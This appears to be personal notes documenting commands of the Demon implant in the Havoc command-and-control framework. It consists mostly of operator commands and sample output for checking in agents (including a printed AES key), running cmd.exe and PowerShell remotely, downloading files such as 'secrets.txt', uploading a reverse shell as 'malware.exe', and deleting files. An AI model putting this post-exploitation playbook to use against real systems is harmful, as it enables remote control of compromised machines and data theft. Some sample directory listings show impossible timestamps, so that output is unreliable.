# 03 - Basic Commands

## 3.1 - Check Request

- Help Menu

```
Demon » help checkin

 - Command       :  checkin
 - Description   :  request a checkin request
```

- Usage

```
Demon » checkin
[*] [47DC3265] Tasked demon send back a checkin request
[+] Send Task to Agent [8 bytes]
[*] Received checkin request

Teamserver:
  - Session Path       : /home/user/Havoc/Teamserver/data/loot/agents/7486e39a

Meta Data:
  - Agent ID           : 7486e39a
  - Magic Value        : 0
  - First Call In      : 02/10/2022 15:58:30
  - Last  Call In      : 02-10-2022 15:58:55
  - AES Key            : 088a0070eca06ee6fc5caaf468f0aa04f2f264c6be9cf8cc2a92b60ca4b45ea4
  - AES IV             : a4ecf6e8c8be96ac8ebe30c84ca6f2ba
  - Sleep Delay        : 5

Host Info:
  - Host Name          : DESKTOP-85J2L4M
  - User Name          : aiden
```

## 3.2 - Navigation

```
Demon » cd <directory_name>

Demon » pwd
[+] Send Task to Agent [12 bytes]
[*] Current directory: C:\Users\aiden
```

## 3.3 - Sleep and Jitter

- Help Menu

```
Demon » help sleep

 - Command       :  sleep
 - Description   :  sets the delay to sleep
 - Usage         :  sleep [delay] (jitter)
 - Example       :  sleep 10
 - Required Args :  2
```

- Usage

`Demon » sleep 10 25`

## 3.4 - List Contents

- Help Menu

```
Demon » help dir

 - Command       :  dir
 - Description   :  list specified directory
 - Behavior      :  API Only
 - Usage         :  dir [/path/to/dir]
 - Example       :  dir c:\windows\system32
```

- Usage

```
Demon » dir c:\
[*] [32D45E71] Tasked demon to list directory: c:\
[+] Send Task to Agent [25 bytes]
[*] List Directory: c:\\*

 Size         Type     Last Modified         Name
 ----         ----     -------------------   ----
              dir      01/10/2022 03:21:15   $Recycle.Bin
              dir      24/09/2022 13:21:14   $WinREAgent
              dir      01/10/2022 31:58:16   Config.Msi
              dir      31/08/2022 26:19:14   Documents and Settings
 12.29 kB     file     02/10/2022 55:56:15   DumpStack.log.tmp
 738.20 MB    file     02/10/2022 55:56:15   pagefile.sys
              dir      02/10/2022 38:15:12   PerfLogs
              dir      02/10/2022 29:57:12   Program Files
              dir      02/10/2022 40:57:12   Program Files (x86)
              dir      02/10/2022 36:57:12   ProgramData
              dir      16/09/2022 34:43:22   Recovery
 268.44 MB    file     02/10/2022 55:56:15   swapfile.sys
              dir      02/10/2022 46:56:15   System Volume Information
              dir      26/09/2022 29:53:15   Temp
              dir      02/10/2022 59:13:12   Users
              dir      02/10/2022 58:56:12   Windows
```

## 3.5 - File Manipulation

- Help Menu

```
Demon » help cp

 - Command       :  cp
 - Description   :  copy file from one location to another
 - Behavior      :  API Only
 - Usage         :  cp [/path/from/file.txt] [path/to/file.txt]
 - Example       :  cp C:\secrets.txt C:\Windows\Temp\secrets.txt

Demon » help mv

 - Command       :  mv
 - Description   :  move file from one location to another
 - Behavior      :  API Only
 - Usage         :  mv [/path/from/file.txt] [path/to/file.txt]
 - Example       :  mv C:\secrets.txt C:\Windows\Temp\secrets.txt
 - Required Args :  2

Demon » help remove

 - Command       :  remove
 - Description   :  remove file or directory
 - Behavior      :  API Only
 - Usage         :  remove [path]
 - Example       :  remove C:\text.txt

Demon » help mkdir

 - Command       :  mkdir
 - Description   :  create new directory
 - Behavior      :  API Only
 - Usage         :  mkdir [/path/to/dir]
 - Example       :  mkdir C:\NewDir

Demon » help cat

 - Command       :  cat
 - Description   :  display content of the specified file
 - Behavior      :  API Only
 - Usage         :  cat [/path/to/file.txt]
 - Example       :  cat c:\secrets.txt
```

- Create directory

`Demon » mkdir C:\path\to\new_directory\`

- Copy file

`Demon » cp C:\path\to\remote\file.txt C:\path\to\remote\copied_file.txt`

- Move file

`Demon » mv C:\path\to\remote\file.txt C:\path\to\remote\moved_file.txt`

`Demon » cat C:\path\to\remote\file.txt`

- Delete file

`Demon » remove C:\path\to\remote\file.txt`

## 3.6 - Execute Shell Commands

### 3.6.1 - Help Menu

```
Demon » help shell

 - Command       :  shell
 - Description   :  executes cmd.exe commands and gets the output
 - Behavior      :  Process Creation
 - Usage         :  shell [commands]
 - Example       :  shell dir c:\windows\system32

Demon » help powershell

 - Command       :  powershell
 - Description   :  executes powershell.exe commands and gets the output
 - Usage         :  powershell [commands]
 - Example       :  powershell dir c:\windows\system32
```

### 3.6.2 - Usage

* Execute any `shell` command that the demon implant spawns a child process `cmd.exe`

`Demon » shell <command> [args]`

* Spawns a child process of `powershell.exe`

`Demon » powershell <cmdlet> [args]`

## 3.7 - Upload and Download Files

```
Demon » help download

 - Command       :  download
 - Description   :  downloads a specified file
 - Behavior      :  API Only
 - Usage         :  download [/path/to/file.txt]
 - Example       :  download c:\secrets.txt

Demon » help upload

 - Command       :  upload
 - Description   :  uploads a specified file
 - Behavior      :  API Only
 - Usage         :  upload [/local/file/to/upload.exe] [/remote/path/to/upload.exe]
 - Example       :  upload /tmp/reverse_shell.exe c:\malware.exe

Demon » help transfer

 - Command       :  transfer
 - Description   :  download transfer module
 - Behavior      :  API Only
 - Usage         :  transfer <subcommand>
 - Example       :  transfer list

  Command                        Description      
  ---------                      -------------     
  list                           list current downloads
  stop                           stops a download
  resume                         resumes a download
  remove                         stops and removes a download
```

## 3.8 - Transfer Files Queue

```
Demon » help transfer list

 - Module        :  transfer
 - Sub Command   :  list
 - Description   :  list current downloads
 - Behavior      :  API Only

Demon » help transfer stop

 - Module        :  transfer
 - Sub Command   :  stop
 - Description   :  stops a download
 - Behavior      :  API Only
 - Usage         :  transfer stop <FileID>
 - Example       :  transfer stop ffff

Demon » help transfer resume

 - Module        :  transfer
 - Sub Command   :  resume
 - Description   :  resumes a download
 - Behavior      :  API Only
 - Usage         :  transfer resume <FileID>
 - Example       :  transfer resume ffff

Demon » help transfer remove

 - Module        :  transfer
 - Sub Command   :  remove
 - Description   :  stops and removes a download
 - Behavior      :  API Only
 - Usage         :  transfer remove <FileID>
 - Example       :  transfer remove ffff
```

## 3.9 - Jobs Queue

### 3.9.1 - Help Menu

```
Demon » help job

 - Command       :  job
 - Description   :  job manager

  Command                        Description
  ---------                      -------------
  list                           list of jobs
  suspend                        suspend specified job id
  resume                         resume specified job id
  kill                           kill specified job id

Demon » help task

 - Command       :  task
 - Description   :  task manager

  Command                        Description
  ---------                      -------------
  list                           list of commands in task queue
  clear                          clear all commands in task queue
```

### 3.9.2 - Usage

`Demon » job list`

`Demon » job suspend <job_id>`

`Demon » job resume <job_id>`

`Demon » job kill <job_id>`

`Demon » task list`

`Demon » task clear`

## 3.10 - Terminate Implant

`Demon » exit`